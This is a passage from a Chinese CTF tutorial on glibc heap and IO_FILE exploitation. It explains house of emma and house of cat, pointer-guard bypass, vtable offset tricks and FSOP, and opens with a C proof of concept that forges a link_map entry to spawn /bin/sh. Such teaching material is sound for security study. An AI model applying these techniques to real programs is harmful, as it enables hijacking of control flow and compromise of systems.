<h3 id="思路2-poc"><a href="#思路2-poc" class="headerlink" title="思路2-poc:"></a>思路2-poc:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">getLibcBase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint64_t</span> to;</span><br><span class="line">	<span class="type">uint64_t</span> from;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">	</span><br><span class="line">	FILE* file;</span><br><span class="line">	<span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="type">int</span>)getpid()); </span><br><span class="line">	file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), file)) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">		    fclose(file);</span><br><span class="line">			<span class="keyword">return</span> from;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint64_t</span> libcBase    = getLibcBase();</span><br><span class="line">	<span class="type">uint64_t</span> rtld_global = libcBase+<span class="number">0x23a060</span>;</span><br><span class="line">	<span class="type">uint64_t</span>* next_node = (<span class="type">uint64_t</span>*)(rtld_global<span class="number">-0x48048</span>);	 </span><br><span class="line">    <span class="comment">// distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">	<span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)<span class="built_in">malloc</span>(<span class="number">0x470</span>);</span><br><span class="line">	<span class="built_in">memset</span>((<span class="type">void</span>*)fake,<span class="number">0</span>,<span class="number">0x470</span>);</span><br><span class="line">	</span><br><span class="line">	*next_node = fake;</span><br><span class="line">    <span class="comment">//l_addr==0</span></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;<span class="comment">//l_init_called</span></span><br><span class="line">	</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;<span class="comment">//l_info[26]</span></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="type">uint64_t</span>)shell;</span><br><span class="line"></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;<span class="comment">//l_info[28]</span></span><br><span class="line">	*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><p><strong>西湖论剑2020决赛-husk</strong></p>
<h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><h2 id="概要-11"><a href="#概要-11" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>在GLIBC2.34 版本中，本应在 CTF 的 PWN 题中常用 Hook — <strong>free_hook 、</strong> <strong>malloc_hook</strong> 被取消，同时有些题目的限制中，又无法构造出任意地址申请。</p>
<p>因此在新版中各种各样的限制下，迫使转变思想：从以往的 <strong>任意地址申请</strong> <strong>→</strong> <strong>构成任意读写</strong> →<strong>从而 Getshell</strong> ，转变为：在某处写一个可控地址直接 Getshell（借助于 IO_FILE）。显而易见的，后者的所需条件一定是少于前者的。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>可以任意写一个可控地址（LargeBin Attack,Tcache Stashing Unlink Attack…）</li>
<li>可以触发 IO 流（FSOP,House OF Kiwi）</li>
</ol>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong></p>
<h2 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h2><p>在 vtable 的合法范围内，存在一个 _IO_cookie_jumps：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在 vtable 的检测中对具体位置的检测还是比较宽松的,只是检查是否在vtable段内，这使得可以在一定的范围内对 vtable 表的起始位置进行偏移，使其在调用<strong>具体偏移是固定</strong>的情况下，可以通过偏移来调用在 vtable 表中的任意函数，因此考虑将其指定为以下几个函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这几个函数内存在任意函数指针调用，且函数指针来源于_IO_cookie_file 结构体，<strong>这个结构体是 _IO_FILE_plus 的扩展</strong>，如果可以控制 IO 的内容，大概率这部分的数据也是可控的，并且其的<strong>第一个参数也是来源于这个结构.也就是可以控制rdi</strong>所以可以把其当做一个类似于 __free_hook 的 Hook 来利用。</p>
<p>结构体定义在glibc/libio/libioP.h中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure>
<p><strong>绕过 PTR_DEMANGLE</strong></p>
<p>在上面的分析中，暂时忽略了一个可能会存在的问题，也就是在上面代码中函数指针调用前所执行的 PTR_DEMANGLE （指针保护）选项是默认开启的，这意味着需要解决指针加密的问题。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure>
<p>根据 <strong>GLIBC Wiki</strong> 上的解释，可以得知这个是 GLIBC 的一项安全功能，用于增加攻击者在 GLIBC 结构中操纵指针（尤其是函数指针）的难度。这时，通过调试可以得知，这个值存在于 TLS 段上，将其 ROR 移位 0x11 后再与指针进行异或。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/940906_U9ZGVURG434TPE6.png" alt=""></p>
<p>fs[0x30] 的值位于与 libc 相邻的空间中，<strong>这个位置距离 libc 地址的偏移固定</strong>，虽然无法泄露<strong>出这个位置随机值的内容</strong>,但是可以<strong>利用很多方法对其进行写入</strong>：</p>
<ol>
<li>Fastbin Reverse Into Tcache</li>
<li>Tcache Stashing Unlink Attack</li>
<li>LargeBin Attack</li>
</ol>
<p>但无论使用什么方法，根本思想：还是让这个本来是随机的、不确定的异或值，转变为已知的地址。而通常在满足能够利用 IO_FILE 的情况下，这个前置要求都能够被满足。</p>
<p>最后因为emma调用链中<strong>rdi是可控</strong>的,所以可以在setcontetxt之前用一些gadget<strong>先由rdi控制rdx</strong></p>
<p>例如如下两个,分别在2.38和2.31找到的gadget</p>
<p><code>mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</code></p>
<p><code>mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</code></p>
<h3 id="实操可能的问题"><a href="#实操可能的问题" class="headerlink" title="实操可能的问题"></a>实操可能的问题</h3><p>如果我们的选择的是利用house of kiwi来触发stderr的io流函数,在实际操作中，可能因为 stderr 的指针存放在 bss 段上，从而导致无法篡改。</p>
<p>只能使用 exit 来触发 FSOP，但是又会发现如果通过 exit 来触发 FSOP，<strong>会遇到在 exit 中也有调用指针保护的函数指针执行，但此时的异或内容被我们所篡改，使得无法执行正确的函数地址</strong>，且此位置在 FSOP 之前，从而导致程序没有进入 IO 流就发生了错误。</p>
<p>这种时候就可以考虑构造两个 IO_FILE，且后者指针处于前者的 _chains 处，前者用 <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216290">GLIBC2.24 之前的 IO_FILE 攻击</a> 的思想在 __pointer_chk_guard 处写已知内容，后者再用 House_OF_Emma 来进行函数指针调用。 </p>
<h2 id="例题-5"><a href="#例题-5" class="headerlink" title="例题"></a>例题</h2><p><strong>2021湖湘杯-House_OF_Emma</strong></p>
<h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><p>参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm">[原创]House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><strong>一种新型GLIBC中IO利用思路，目前适用于任何版本（包括glibc2.35）</strong></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-270429.htm">House of emma</a>是glibc2.34下常用的攻击手法之一，利用条件只需任意写一个可控地址就可以控制程序执行流，攻击威力十分强大。但是需要攻击位于TLS的<strong>_pointer_chk_guard</strong>，并且远程可能需要爆破TLS偏移。</p>
<p>House of Cat利用了House of emma的虚表偏移修改思想，通过修改虚表指针的偏移，避免了对需要绕过TLS上 <strong>_pointer_chk_guard</strong>的检测相关的IO函数的调用，转而调用<strong>_IO_wfile_jumps</strong>中的<strong>_IO_wfile_seekoff</strong>函数，然后进入到<strong>_IO_switch_to_wget_mode</strong>函数中来攻击，从而使得攻击条件和利用变得更为简单。并且house of cat在<strong>FSOP</strong>的情况下也是可行的，只需修改虚表指针的偏移来调用<strong>_IO_wfile_seekoff</strong>即可（通常是结合<strong>__malloc_assert</strong>，改vtable为<strong>_IO_wfile_jumps+0x10</strong>）。</p>
<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
<li>能够任意写一个可控地址。</li>
<li>能够泄露堆地址和libc基址。</li>
<li>能够触发IO流（FSOP或触发__malloc_assert，或者程序中存在puts等能进入IO链的函数），执行IO相关函数。</li>
</ol>
<h3 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h3><h4 id="IO-FILE结构及利用"><a href="#IO-FILE结构及利用" class="headerlink" title="IO_FILE结构及利用"></a>IO_FILE结构及利用</h4><p>在高版本libc中，当攻击条件有限（如不能造成任意地址写）或者libc版本中无hook函数（libc2.34及以后）时，伪造fake_IO进行攻击是一种常见可行的攻击方式，</p>
<p>常见的触发IO函数的方式有FSOP、__malloc_assert（当然也可以用puts等函数，只不过需要任意地址写任意值直接改掉libc中的stdout结构体），</p>
<p><strong>当进入IO流时会根据vtable指针调用相关的IO函数</strong>，如果在题目中造成任意地址写一个可控地址（如large bin attack、tcache stashing unlink attack、fastbin reverse into tcache），然后伪造fake_IO结构体配合恰当的IO调用链，可以达到控制程序执行流的效果。</p>
<h4 id="vtable检查"><a href="#vtable检查" class="headerlink" title="vtable检查"></a>vtable检查</h4><p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable 段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，<strong>可以修改vtable指针为虚表段内的任意位置</strong>，也就是对于某一个<strong>_IO_xxx_jumps</strong>的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
<h4 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h4><p>在glibc中存在一个函数_malloc_assert，其中会根据vtable表如_IO_xxx_jumps调用IO等相关函数；</p>
<p><strong>该函数最终会根据<code>stderr</code>这个IO结构体进行相关的IO操作</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p>
<blockquote>
<p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p>
</blockquote>
<hr>
<p>下面介绍另一种触发house of cat的方式FSOP</p>
<p>程序中所有的_IO_FILE 结构用_chain连接形成一个单链表，链表的头部则是_IO_list_all</p>
<p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，这个函数会根据_IO_list_all刷新链表中的所有文件流，</p>
<p>在libc中代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>其中会调用vtable中的IO函数_IO_OVERFLOW，根据上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</strong></p>
<p>FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），</p>
<p><strong>第三种情况在高版本中已经删除</strong>;</p>
<p>__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p>
<h4 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h4><p>在_IO_wfile_jumps结构体中，会根据虚表进行相关的函数调用。</p>
